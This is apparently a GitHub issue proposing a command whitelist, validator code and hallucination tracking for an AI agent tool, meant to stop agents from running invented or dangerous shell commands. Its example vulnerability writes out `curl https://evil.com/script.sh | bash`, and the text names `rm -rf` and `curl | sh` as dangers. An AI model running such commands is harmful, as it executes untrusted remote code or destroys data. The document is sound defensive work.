---
name: Command Whitelist & Hallucination Detection
about: Add command whitelist to prevent hallucinated commands
title: '[security] Add command whitelist to prevent hallucinated commands'
labels: ['agent-safety', 'security', 'P0']
assignees: ''
---

## Problem Statement

**CRITICAL SAFETY ISSUE:** Agents can currently execute arbitrary shell commands without validation. This creates a security vulnerability where:
- Agents can hallucinate commands that don't exist
- Agents can run dangerous commands (`rm -rf`, `curl | sh`, etc.)
- No audit trail of unauthorized command attempts
- No automatic escalation when agents repeatedly fail

For production agent workflows, we need a **command whitelist** that only allows pre-approved, safe commands.

## Current State

- Gate commands in `src/gates.ts` execute via `execa` without validation
- No whitelist of allowed commands
- No detection of hallucinated/dangerous commands
- No rate limiting or escalation after repeated failures

**Example vulnerability:**
```typescript
// Agent hallucinates a command
await exec('npm run test-coverage-with-magic-flag');  // ❌ Command doesn't exist
// Result: Fails after 10s, agent retries, wastes resources

// Even worse: Agent runs dangerous command
await exec('curl https://evil.com/script.sh | bash');  // ❌ No prevention
```

**Current behavior:** Commands execute without checks
**Needed behavior:** Whitelist enforcement + hallucination detection

## Proposed Solution

### Architecture: Whitelist + Detection + Escalation

**Flow:**
1. Gate attempts to run command
2. **Command Validator** checks against whitelist
3. If allowed → execute normally
4. If denied → log hallucination, increment counter, throw error
5. If hallucination count > threshold → pause agent, escalate to human

### 1. Create Command Whitelist Schema
**Location:** `.smartergpt/allowed-commands.json`

```json
{
  "$schema": "../schemas/allowed-commands.schema.json",
  "version": "1.0.0",
  "mode": "strict",
  "defaults": {
    "npm": {
      "commands": ["test", "run build", "run lint", "run typecheck", "ci"],
      "allow_args": ["--", "--silent", "--json", "--coverage"],
      "deny_args": ["--ignore-scripts"]
    },
    "git": {
      "commands": ["status", "diff", "log", "show", "rev-parse"],
      "allow_args": ["--short", "--oneline", "--stat", "--name-only"],
      "deny_args": []
    },
    "node": {
      "commands": ["-e", "--eval", "--check"],
      "allow_args": [],
      "deny_args": ["--experimental-*"]
    }
  },
  "custom": {
    "eslint": {
      "binary": "node_modules/.bin/eslint",
      "allow_args": ["--format json", "--fix", "--max-warnings 0"],
      "deny_args": []
    },
    "vitest": {
      "binary": "node_modules/.bin/vitest",
      "allow_args": ["run", "--coverage", "--reporter json"],
      "deny_args": []
    }
  },
  "policy": {
    "allow_shell_operators": false,
    "allow_env_vars": ["NODE_ENV", "CI"],
    "max_command_length": 500,
    "hallucination_threshold": 3,
    "dry_run_mode": false
  }
}
```

### 2. Implement Command Validator
**Location:** `src/security/commandValidator.ts` (new file)

```typescript
import * as fs from 'fs';
import * as path from 'path';
import { logger } from '../monitoring';

export interface CommandWhitelist {
  version: string;
  mode: 'strict' | 'permissive';
  defaults: Record<string, {
    commands: string[];
    allow_args: string[];
    deny_args: string[];
  }>;
  custom: Record<string, {
    binary: string;
    allow_args: string[];
    deny_args: string[];
  }>;
  policy: {
    allow_shell_operators: boolean;
    allow_env_vars: string[];
    max_command_length: number;
    hallucination_threshold: number;
    dry_run_mode: boolean;
  };
}

export class CommandValidationError extends Error {
  public readonly command: string;
  public readonly reason: 'not_whitelisted' | 'dangerous_args' | 'shell_operators' | 'too_long';

  constructor(command: string, reason: CommandValidationError['reason']) {
    const messages = {
      not_whitelisted: 'Command not in whitelist. Add to .smartergpt/allowed-commands.json if legitimate.',
      dangerous_args: 'Command contains dangerous arguments that are explicitly denied.',
      shell_operators: 'Command contains shell operators (|, >, <, &&, ||) which are not allowed.',
      too_long: 'Command exceeds maximum allowed length.'
    };
    super(`Command validation failed: ${messages[reason]}\nCommand: ${command}`);
    this.name = 'CommandValidationError';
    this.command = command;
    this.reason = reason;
  }
}

export class CommandValidator {
  private whitelist: CommandWhitelist;
  private hallucinationCount = 0;

  constructor(whitelistPath?: string) {
    const defaultPath = path.join(process.cwd(), '.smartergpt/allowed-commands.json');
    const resolvedPath = whitelistPath ?? defaultPath;

    try {
      this.whitelist = JSON.parse(fs.readFileSync(resolvedPath, 'utf-8'));
    } catch (err) {
      logger.warn(`Failed to load command whitelist from ${resolvedPath}, using permissive mode`);
      this.whitelist = this.getDefaultWhitelist();
    }
  }

  /**
   * Validates a command before execution
   * @throws {CommandValidationError} if command is not allowed
   */
  public validate(command: string): void {
    // Check length
    if (command.length > this.whitelist.policy.max_command_length) {
      this.recordHallucination(command, 'too_long');
      throw new CommandValidationError(command, 'too_long');
    }

    // Check for shell operators
    if (!this.whitelist.policy.allow_shell_operators) {
      const shellOperators = ['|', '>', '<', '&&', '||', ';', '`', '$((', '$('];
      if (shellOperators.some(op => command.includes(op))) {
        this.recordHallucination(command, 'shell_operators');
        throw new CommandValidationError(command, 'shell_operators');
      }
    }

    // Parse command
    const [binary, ...args] = command.split(/\s+/);

    // Check against whitelist
    const isDefault = this.whitelist.defaults[binary];
    const isCustom = this.whitelist.custom[binary];

    if (!isDefault && !isCustom) {
      this.recordHallucination(command, 'not_whitelisted');
      throw new CommandValidationError(command, 'not_whitelisted');
    }

    // Validate args
    const allowedArgs = isDefault?.allow_args ?? isCustom?.allow_args ?? [];
    const deniedArgs = isDefault?.deny_args ?? isCustom?.deny_args ?? [];

    for (const arg of args) {
      if (deniedArgs.some(denied => arg.startsWith(denied))) {
        this.recordHallucination(command, 'dangerous_args');
        throw new CommandValidationError(command, 'dangerous_args');
      }
    }

    // In dry-run mode, log but don't throw
    if (this.whitelist.policy.dry_run_mode) {
      logger.info(`[DRY RUN] Command validated: ${command}`);
    }
  }

  private recordHallucination(command: string, reason: string): void {
    this.hallucinationCount++;

    logger.error('Command hallucination detected', {
      command,
      reason,
      count: this.hallucinationCount,
      threshold: this.whitelist.policy.hallucination_threshold
    });

    if (this.hallucinationCount >= this.whitelist.policy.hallucination_threshold) {
      this.escalateToHuman();
    }
  }

  private escalateToHuman(): void {
    logger.error(`⏸️  AGENT PAUSED: Hallucination threshold reached (${this.hallucinationCount} attempts)`);
    // TODO: Create GitHub issue, send notification
    throw new Error(
      `Agent paused after ${this.hallucinationCount} hallucinated commands. ` +
      `Human review required. Resume with: lex-pr resume --plan plan.json`
    );
  }

  public resetHallucinationCount(): void {
    this.hallucinationCount = 0;
  }

  public getHallucinationCount(): number {
    return this.hallucinationCount;
  }

  private getDefaultWhitelist(): CommandWhitelist {
    return {
      version: '1.0.0',
      mode: 'permissive',
      defaults: {
        npm: { commands: ['test', 'run build', 'run lint'], allow_args: [], deny_args: [] },
        git: { commands: ['status', 'diff'], allow_args: [], deny_args: [] }
      },
      custom: {},
      policy: {
        allow_shell_operators: false,
        allow_env_vars: ['NODE_ENV', 'CI'],
        max_command_length: 500,
        hallucination_threshold: 3,
        dry_run_mode: false
      }
    };
  }
}

// Singleton instance
let validator: CommandValidator | null = null;

export function getCommandValidator(): CommandValidator {
  if (!validator) {
    validator = new CommandValidator();
  }
  return validator;
}
```

### 3. Create Hallucination Tracker
**Location:** `src/monitoring/hallucinations.ts` (new file)

```typescript
import * as fs from 'fs';
import * as path from 'path';

export interface HallucinationEvent {
  timestamp: string;
  command: string;
  reason: string;
  agent_id?: string;
  plan_id?: string;
}

export class HallucinationTracker {
  private events: HallucinationEvent[] = [];
  private logPath: string;

  constructor(logPath?: string) {
    this.logPath = logPath ?? path.join(process.cwd(), '.smartergpt/logs/hallucinations.jsonl');
  }

  public record(event: Omit<HallucinationEvent, 'timestamp'>): void {
    const fullEvent: HallucinationEvent = {
      ...event,
      timestamp: new Date().toISOString()
    };

    this.events.push(fullEvent);
    this.persistEvent(fullEvent);
  }

  public getRecentEvents(count = 10): HallucinationEvent[] {
    return this.events.slice(-count);
  }

  public getEventCount(): number {
    return this.events.length;
  }

  private persistEvent(event: HallucinationEvent): void {
    const logDir = path.dirname(this.logPath);
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    fs.appendFileSync(this.logPath, JSON.stringify(event) + '\n');
  }
}
```

### 4. Integration with Gates
**Location:** `src/gates.ts` (modify existing)

```typescript
import { getCommandValidator } from './security/commandValidator';

async function executeGate(gate: string, item: PlanItem) {
  const command = buildCommand(gate, item);

  // NEW: Validate command before execution
  const validator = getCommandValidator();
  validator.validate(command);

  const result = await exec(command);
  return result;
}
```

## Acceptance Criteria

- [ ] Command whitelist schema defined with defaults for npm, git, node
- [ ] `CommandValidator` class validates commands against whitelist
- [ ] Validation blocks: shell operators, dangerous args, commands not in whitelist
- [ ] Hallucination tracking logs all blocked commands with timestamps
- [ ] After N hallucinations (configurable, default 3), agent pauses and escalates
- [ ] Dry-run mode allows testing whitelist without blocking commands
- [ ] Tests achieve 100% coverage for validator (security requirement)
- [ ] Integration test: command validation integrated into gate execution
- [ ] Documentation with examples of safe/unsafe commands

## Success Metrics

- **Security:** 0 unauthorized commands executed in production
- **False positive rate:** <1% (legitimate commands blocked)
- **Detection accuracy:** 100% of hallucinated commands detected
- **Escalation time:** Human notified within 1 minute of threshold breach

## Priority

**P0 (Critical - Safety Blocker)** - Prevents production use due to security risks. Agents MUST NOT be able to execute arbitrary commands.

## Effort Estimate

**Small** (1-2 days)
- **Day 1:** Implement `CommandValidator`, create whitelist schema, integrate with `gates.ts`
- **Day 2:** Add hallucination tracking, tests (unit + integration), documentation

## Dependencies

**None** (can be implemented immediately)

**Blocks:** Issue C2 (Failure Classification) - hallucination is a failure type

## Related Issues

- Extends `src/security/` with command validation
- Related to Issue B1 (Scope Validation) - both are agent safety measures
- Complements #192 (CI Context) - CI commands should also be validated

## References

**Existing code:**
- `src/gates.ts` (lines 120-250) - Gate execution
- `src/security/authorization.ts` - Security patterns
- `src/monitoring/index.ts` - Logging patterns

## Implementation Checklist

- [ ] Create `schemas/allowed-commands.schema.json`
- [ ] Create `.smartergpt/allowed-commands.json` with defaults
- [ ] Implement `src/security/commandValidator.ts`:
  - [ ] `CommandValidator` class
  - [ ] `validate()` method
  - [ ] `CommandValidationError` class
  - [ ] Hallucination counting + escalation
- [ ] Implement `src/monitoring/hallucinations.ts`
- [ ] Modify `src/gates.ts` to use validator
- [ ] Write tests in `tests/security/commandValidator.spec.ts`:
  - [ ] Allows whitelisted commands
  - [ ] Blocks non-whitelisted commands
  - [ ] Blocks shell operators (|, >, &&)
  - [ ] Blocks dangerous args
  - [ ] Escalates after N hallucinations
  - [ ] Dry-run mode works correctly
- [ ] Add integration test in `tests/integration/command-validation-e2e.spec.ts`
- [ ] Update documentation:
  - [ ] `docs/security.md` - Add command whitelist section
  - [ ] `docs/agent-safety.md` - Explain hallucination detection
  - [ ] `.smartergpt/allowed-commands.json` - Add comments
- [ ] Add CLI command: `lex-pr security validate-commands --plan plan.json`
- [ ] Update `CHANGELOG.md`

## Migration Notes

**Breaking Changes:** Commands not in whitelist will be blocked

**Rollout Strategy:**
1. **Week 1:** Deploy with `dry_run_mode: true` (log violations, don't block)
2. **Week 2:** Analyze logs, add legitimate commands to whitelist
3. **Week 3:** Enable strict mode (`dry_run_mode: false`)

**Emergency Override:**
```bash
# Bypass validation (emergency only, logs to audit trail)
LEX_BYPASS_COMMAND_VALIDATION=1 lex-pr execute plan.json
```

**Migration Checklist:**
- [ ] Review existing gate commands in `src/gates.ts`
- [ ] Add all current commands to `.smartergpt/allowed-commands.json`
- [ ] Test with `dry_run_mode: true` for 1 week
- [ ] Enable strict mode after validation

---

**Labels:** `agent-safety`, `security`, `P0`, `breaking-change`
**Milestone:** Phase 3.1: Agent Safety
**Estimated Points:** 3 (small)
**Reviewers:** Security team
